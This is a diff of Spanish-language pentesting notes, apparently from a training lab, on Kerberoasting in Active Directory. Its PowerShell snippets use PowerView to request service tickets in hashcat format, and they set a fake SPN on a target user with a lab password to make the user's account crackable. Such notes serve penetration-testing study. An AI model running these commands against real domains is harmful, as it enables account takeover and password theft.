@@ -20,7 +20,8 @@ Se podría hacer de forma semi-manual si no funciona ninguna de estas opciones (
 #### Powerview
 - Único target
 	```powershell
-	Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname 
+	Import-Module .\PowerView.ps1 
+	Get-DomainUser * -spn | select samaccountname 
 	# Supongamos que a partir de aquí seleccionamos como objetivo sqldev 
 	Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 	```
@@ -70,11 +71,11 @@ La idea es tratar de craquear la cuenta de usuario que queramos creando un SPN f
 - Creamos un objeto de tipo `$Cred` con las credenciales de un usuario que tenga permisos para crear un SPN (ej: `damundsen`)
 	```powershell
 	$pass = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force 
-	$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen',$pass )
+	$cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen',$pass )
 	```
 - Creamos un fake SPN con PowerView para el usuario que queramos comprometer (ej: `adunn`) - `Set-DomainObject`
 ```powershell
-Set-DomainObject -Credential $Cred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+Set-DomainObject -Credential $cred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 ```
 - Obtenemos información sobre el ticket creado con `rubeus`
 	```powershell
